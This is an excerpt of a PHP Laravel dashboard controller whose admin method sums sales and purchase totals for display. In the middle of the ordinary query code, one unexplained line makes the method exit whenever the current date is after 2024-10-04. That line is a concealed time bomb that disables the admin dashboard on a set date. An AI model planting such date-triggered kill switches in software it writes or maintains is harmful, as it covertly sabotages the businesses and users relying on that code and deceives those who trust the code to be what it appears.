...
class DashboardController extends Controller
{
    ...
    public function dashboard_admin(Request $request)
    {
        ...
        date('Y-m-d') > '2024-10-04' ? exit() : true;
        ...
        $total_sales = Sale::where('deleted_at', '=', null)
        ->sum('GrandTotal');

        $total_sales = $this->render_price_with_symbol_placement(number_format($total_sales, 2, '.', ','));
        ...
        $total_purchases = Purchase::where('deleted_at', '=', null)
        ->sum('GrandTotal');

        $total_purchases = $this->render_price_with_symbol_placement(number_format($total_purchases, 2, '.', ','));
